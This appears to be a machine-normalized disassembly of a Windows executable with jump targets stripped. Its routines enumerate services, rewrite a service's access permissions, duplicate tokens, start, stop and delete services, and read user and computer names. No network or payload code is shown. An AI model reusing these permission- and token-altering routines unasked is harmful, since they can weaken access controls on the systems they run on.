mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
mov cx [ eax + 0x8 ]
mov [ esi + 0x8 ] cx
push 0xffffffff
lea ecx [ esi + 0xc ]
push ebx
add eax 0xc
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] bl
call sub_405cb0
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
sub_40d3b0
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
call sub_40d090
add esi 0x28
cmp esi edi
jne r-xdata
sub_40d3f0
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ esi ]
push ebx
push edi
lea eax [ ebp - 0x14 ]
push eax
xor ebx ebx
push ebx
lea ecx [ ebp - 0x54 ]
push ecx
push 0x4
push edx
mov [ ebp - 0xd ] bl
mov [ ebp - 0x14 ] ebx
call [ QueryServiceObjectSecurity@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov al bl
xor ecx ebp
pop ebx
call sub_437c1c
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call sub_435b34
mov edx [ ebp - 0x14 ]
add esp 0x4
lea ecx [ ebp - 0x14 ]
push ecx
push edx
mov edi eax
mov eax [ esi ]
push edi
push 0x4
push eax
call [ QueryServiceObjectSecurity@IAT ]
test eax eax
je r-xdata
push edi
call sub_438111
mov al [ ebp - 0xd ]
add esp 0x4
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x18 ]
push ecx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x100
mov [ ebp - 0x18 ] ebx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
xor eax eax
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x40 ]
push edx
push edi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
push ebx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x18 ]
push ebx
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x3c ]
push eax
push 0x1
push ebx
push ebx
mov [ ebp - 0x38 ] 0x2
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x3c ] 0x201fd
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] 0x5
mov [ ebp - 0x1c ] ebx
call [ BuildSecurityDescriptorW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ FreeSid@IAT ]
mov ecx [ ebp - 0x1c ]
mov edx [ esi ]
push ecx
push 0x4
push edx
call [ SetServiceObjectSecurity@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
push eax
setne [ ebp - 0xd ]
call [ LocalFree@IAT ]
sub_40d540
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ecx ecx
push esi
mov esi eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
cmp esi ecx
je r-xdata
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov ebx [ LookupAccountSidW@IAT ]
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push ecx
lea edx [ ebp - 0x8 ]
push edx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov edx 0x2
mul edx
seto cl
push edi
neg ecx
or ecx eax
push ecx
call sub_435b34
mov edi eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x8
mov [ ebp - 0xc ] eax
test esi esi
je r-xdata
xor esi esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp - 0xc ]
push edx
call sub_438111
push edi
call sub_438111
add esp 0x8
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
lea edx [ eax + 0x2 ]
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push ecx
push esi
call ebx
test eax eax
setne bl
test bl bl
je r-xdata
mov esi [ esi ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0xc ]
sub eax edx
sar eax 0x1
push eax
mov eax edi
call sub_401c90
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0xc ]
call sub_4019c0
sub_40d650
push ebp
mov ebp esp
push ecx
push ebx
lea eax [ ebp - 0x4 ]
push eax
xor ebx ebx
push ebx
push ebx
push 0x1
push edi
mov [ ebp - 0x4 ] ebx
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x4 ]
push esi
push ecx
call sub_435b34
add esp 0x4
mov esi eax
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
push esi
push 0x1
push edi
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push esi
call sub_438111
add esp 0x4
pop esi
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ esi ]
push ecx
push edx
push eax
xor eax eax
call sub_40d540
add esp 0xc
mov bl al
sub_40d6d0
push ebp
mov ebp esp
push ecx
mov ecx [ esi ]
push ebx
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x3
push 0x0
push 0x2000000
push ecx
call [ DuplicateTokenEx@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
sub_40d710
push ebp
mov ebp esp
push 0xffffffff
push sub_452050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc ]
xor bl bl
xor edi edi
mov [ ebp - 0x6d ] bl
cmp eax edi
je r-xdata
xor eax eax
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov al bl
push edi
lea ecx [ ebp - 0x80 ]
push ecx
lea edx [ ebp - 0x78 ]
push edx
lea eax [ ebp - 0x74 ]
push eax
push edi
push edi
push 0x3
push 0x3b
push edi
push esi
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x80 ] edi
call [ EnumServicesStatusExW@IAT ]
test eax eax
jne r-xdata
push 0x5
push r--data
push eax
call [ OpenSCManagerW@IAT ]
mov esi eax
mov [ ebp - 0x84 ] esi
cmp esi edi
je r-xdata
mov eax [ eax ]
jmp r-xdata
push esi
call [ CloseServiceHandle@IAT ]
push edi
call [ SetLastError@IAT ]
mov al [ ebp - 0x6d ]
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x74 ]
push ecx
call sub_435b34
add esp 0x4
push edi
mov ebx eax
lea edx [ ebp - 0x80 ]
push edx
mov edx [ ebp - 0x74 ]
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x74 ]
push ecx
push edx
push ebx
push 0x3
push 0x3b
push edi
push esi
mov [ ebp - 0x88 ] ebx
call [ EnumServicesStatusExW@IAT ]
test eax eax
setne al
mov [ ebp - 0x6d ] al
test al al
je r-xdata
push ebx
call sub_438111
add esp 0x4
call [ GetLastError@IAT ]
mov edi eax
mov [ ebp - 0x7c ] edi
cmp [ ebp - 0x78 ] edi
jbe r-xdata
add ebx 0x8
jmp r-xdata
mov eax [ ebx - 0x8 ]
xor ecx ecx
mov [ ebp - 0x6c ] cx
mov ecx eax
mov [ ebp - 0x58 ] 0x7
mov [ ebp - 0x5c ] edi
lea esi [ ecx + 0x2 ]
lea ebx [ ebx ]
mov dx [ ecx ]
add ecx 0x2
cmp dx di
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x6c ]
call sub_401c90
mov [ ebp - 0x4 ] edi
mov eax [ ebx - 0x4 ]
xor edx edx
mov ecx eax
mov [ ebp - 0x50 ] dx
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x40 ] edi
lea edx [ ecx + 0x2 ]
mov si [ ecx ]
add ecx 0x2
cmp si di
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x50 ]
call sub_401c90
mov ecx 0x9
mov esi ebx
lea edi [ ebp - 0x34 ]
[ edi ] [ esi ]
mov edi [ ebp - 0x8c ]
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_40dbb0
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_416940
mov eax [ ebp - 0x7c ]
inc eax
add ebx 0x2c
mov [ ebp - 0x7c ] eax
cmp eax [ ebp - 0x78 ]
jb r-xdata
xor edi edi
mov esi [ ebp - 0x84 ]
mov ebx [ ebp - 0x88 ]
sub_40d910
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
push 0x10
mov [ ebp - 0x1 ] 0x0
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0x8 ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x8 ] edi
jmp r-xdata
cmp edi ebx
je r-xdata
push esi
mov esi [ edi ]
cmp esi [ edi + 0x4 ]
je r-xdata
push ebx
push edi
call sub_40d710
add esp 0x8
test al al
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
cmp eax ebx
je r-xdata
pop esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push edi
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
call sub_43811c
add esp 0x4
mov ecx [ ebp - 0x8 ]
mov ebx [ edi + 0x4 ]
push ecx
call sub_40de30
mov edx [ edi ]
push edx
call sub_43811c
add esp 0x8
xor ebx ebx
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push 0x0
push esi
or eax 0xffffffff
mov edi ebx
call sub_401be0
push 0x0
lea eax [ esi + 0x1c ]
push eax
lea edi [ ebx + 0x1c ]
or eax 0xffffffff
call sub_401be0
add esi 0x38
lea edi [ ebx + 0x38 ]
mov ecx 0x9
[ edi ] [ esi ]
mov edi [ ebp - 0x8 ]
add esi 0x5c
cmp esi [ edi + 0x4 ]
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4019f0
push eax
push ebx
call sub_438e70
add esp 0x8
test eax eax
sete al
mov [ ebp - 0x1 ] al
test al al
jne r-xdata
jmp r-xdata
xor ebx ebx
sub_40da00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x1
push r--data
push 0x0
mov esi eax
xor bl bl
mov [ ebp - 0x4 ] 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
push 0x0
push 0x0
push esi
call [ StartServiceW@IAT ]
test eax eax
setne bl
test bl bl
jne r-xdata
push 0x10
push eax
push edi
call [ OpenServiceW@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
push edi
call [ CloseServiceHandle@IAT ]
push esi
call [ SetLastError@IAT ]
sub_40da90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x1
push r--data
push 0x0
mov esi eax
xor bl bl
mov [ ebp - 0x4 ] 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
push esi
call [ DeleteService@IAT ]
test eax eax
setne bl
test bl bl
jne r-xdata
push 0x10000
push eax
push edi
call [ OpenServiceW@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
push edi
call [ CloseServiceHandle@IAT ]
push esi
call [ SetLastError@IAT ]
sub_40db20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x1
push r--data
push 0x0
mov esi eax
xor bl bl
mov [ ebp - 0x4 ] 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
push 0x1
push esi
call [ ControlService@IAT ]
test eax eax
setne bl
test bl bl
jne r-xdata
push 0x20
push eax
push edi
call [ OpenServiceW@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
push edi
call [ CloseServiceHandle@IAT ]
push esi
call [ SetLastError@IAT ]
sub_40dbb0
push ebp
mov ebp esp
push 0xffffffff
push sub_452022
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx edi
call sub_40dc60
sub esi eax
mov eax 0xb21642c9
imul esi
add edx esi
sar edx 0x6
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x5c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
mov eax [ edi + 0x4 ]
imul esi esi 0x5c
add esi [ edi ]
mov [ ebp - 0x10 ] eax
mov ecx esi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx edi
call sub_40dc60
jmp r-xdata
push eax
call sub_40de90
sub_40dc60
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0xb21642c9
imul esi
add edx esi
sar edx 0x6
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x2c8590a
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0xb21642c9
imul edi
add edx edi
sar edx 0x6
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x2c8590b
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_40dce0
mov eax esi
cmp eax esi
jae r-xdata
sub_40dce0
push ebp
mov ebp esp
push 0xffffffff
push sub_451fe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x2c8590b
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0xb21642c9
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_40dde0
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_40df20
mov ebx [ esi + 0x4 ]
mov ecx [ esi ]
mov edi ebx
sub edi ecx
mov eax 0xb21642c9
imul edi
add edx edi
sar edx 0x6
mov edi edx
shr edi 0x1f
add esp 0x10
add edi edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
imul edi edi 0x5c
mov ecx [ ebp - 0x14 ]
imul eax eax 0x5c
add eax ecx
add edi ecx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] edi
mov [ esi ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_40de30
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x8
sub_40dde0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x2c8590b
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
imul ecx ecx 0x5c
push ecx
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_40de30
cmp eax ebx
je r-xdata
retn
push esi
push edi
lea esi [ eax + 0x30 ]
xor edi edi
jmp r-xdata
cmp [ esi ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] edi
mov [ esi - 0x14 ] cx
cmp [ esi - 0x1c ] 0x8
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi - 0x1c ] 0x7
mov [ esi - 0x20 ] edi
mov [ esi - 0x30 ] ax
add esi 0x5c
lea ecx [ esi - 0x30 ]
cmp ecx ebx
jne r-xdata
mov edx [ esi - 0x30 ]
push edx
call sub_43811c
add esp 0x4
pop edi
pop esi
sub_40de90
push ebp
mov ebp esp
push 0xffffffff
push sub_451818
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx [ ebp + 0x8 ]
xor eax eax
push eax
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] ax
push esi
or eax 0xffffffff
mov edi ebx
call sub_401be0
xor eax eax
mov [ ebp - 0x4 ] eax
lea edi [ ebx + 0x1c ]
push eax
mov [ edi + 0x10 ] eax
lea edx [ esi + 0x1c ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
add esi 0x38
lea edi [ ebx + 0x38 ]
mov ecx 0x9
[ edi ] [ esi ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40df20
push ebp
mov ebp esp
push 0xffffffff
push sub_451fb9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
add ebx 0x5c
add esi 0x5c
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x10 ] ebx
mov [ ebp + 0x8 ] esi
jmp r-xdata
xor eax eax
push eax
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] ax
push esi
or eax 0xffffffff
mov edi ebx
call sub_401be0
xor ecx ecx
lea edi [ ebx + 0x1c ]
mov [ ebp - 0x4 ] 0x2
push ecx
lea edx [ esi + 0x1c ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
add esi 0x38
lea edi [ ebx + 0x38 ]
mov ecx 0x9
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
sub_40dfdf
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
call sub_416940
add esi 0x5c
cmp esi edi
jne r-xdata
sub_40e020
push ebp
mov ebp esp
push 0xffffffff
push sub_4529b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ ebp - 0x14 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov edi [ ebp + 0x10 ]
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
xor ecx ecx
jmp r-xdata
mov [ ebp - 0xbc ] r--data
mov [ ebp - 0xac ] r--data
mov [ ebp - 0x5c ] r--data
lea eax [ ebp - 0xa4 ]
push eax
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x1
mov esi 0x2
push ecx
mov [ ebp - 0x14 ] esi
call sub_4043f0
mov [ ebp - 0x4 ] esi
mov edx [ ebp - 0xbc ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xa4 ]
mov [ ebp + eax - 0xbc ] r--data
call sub_4047b0
mov [ ebp - 0xa4 ] r--data
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x64 ] ebx
push ebx
lea ecx [ ebp - 0xcc ]
push 0x8
mov [ ebp - 0x4 ] 0x4
push ecx
mov [ ebp + 0xc ] ebx
call sub_4374b3
add esp 0xc
lea edx [ ebp - 0xac ]
push r--data
push edx
mov esi eax
call sub_409de0
mov ecx esi
add esp 0x8
mov esi eax
call sub_40e920
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov edx 0x30
mov [ ecx + eax + 0x40 ] dx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax + 0x14 ]
and edx 0xfffff9ff
push edi
or edx 0x800
push eax
mov [ ecx + eax + 0x14 ] edx
call sub_408170
cmp eax ebx
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
push ecx
lea eax [ ebp - 0xac ]
push 0x20
push eax
call sub_40e950
add esp 0xc
push eax
call sub_409de0
mov ecx [ ebp + 0xc ]
add esp 0x8
push ecx
call [ LocalFree@IAT ]
jmp r-xdata
push ebx
push ebx
lea ecx [ ebp + 0xc ]
push ecx
push 0x400
push edi
push r--data
call [ GetModuleHandleW@IAT ]
push eax
push 0x19ff
call esi
test eax eax
setne al
cmp al bl
je r-xdata
mov edx [ ecx + 0x14 ]
and edx 0xfffff3ff
or edx 0x200
push 0x29
push eax
mov [ ecx + 0x14 ] edx
call sub_40e950
mov esi [ FormatMessageW@IAT ]
add esp 0x8
push ebx
push ebx
lea eax [ ebp + 0xc ]
push eax
push 0x400
push edi
push ebx
push 0x11ff
call esi
test eax eax
setne al
cmp al bl
jne r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0xbc ]
call sub_403b50
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x14 ] 0x3
mov [ ebp - 0x4 ] bl
call sub_403550
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xac ]
push r--data
push edx
call sub_409de0
add esp 0x8
sub_40e230
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ GetUserNameExW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x2
xor bl bl
mov [ ebp - 0x4 ] 0x0
call edi
test al al
jne r-xdata
pop edi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x2
mul edx
seto cl
push esi
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x4
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x2
call edi
test al al
setne bl
test bl bl
je r-xdata
push esi
call sub_438111
add esp 0x4
pop esi
mov eax esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edx
sar eax 0x1
push eax
mov eax esi
call sub_401c90
sub_40e2d0
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ GetComputerNameExW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x7
xor bl bl
mov [ ebp - 0x4 ] 0x0
call edi
test eax eax
jne r-xdata
pop edi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x2
mul edx
seto cl
push esi
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x4
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x7
call edi
test eax eax
setne bl
test bl bl
je r-xdata
push esi
call sub_438111
add esp 0x4
pop esi
mov eax esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edx
sar eax 0x1
push eax
mov eax esi
call sub_401c90
sub_40e370
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
xor bl bl
call [ GetCurrentDirectoryW@IAT ]
xor ecx ecx
mov esi eax
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x4
mov edi eax
test esi esi
je r-xdata
push edi
call sub_43811c
add esp 0x4
pop edi
pop esi
mov al bl
pop ebx
pop ebp
retn
push edi
push esi
call [ GetCurrentDirectoryW@IAT ]
dec esi
cmp eax esi
jne r-xdata
mov eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edx
sar eax 0x1
push eax
mov eax edi
call sub_401c90
mov bl 0x1
sub_40e3f0
push ebp
mov ebp esp
push 0xffffffff
push sub_451f6b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x22c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] 0x8
mov [ ebp - 0x238 ] eax
jb r-xdata
mov eax esi
mov eax [ esi ]
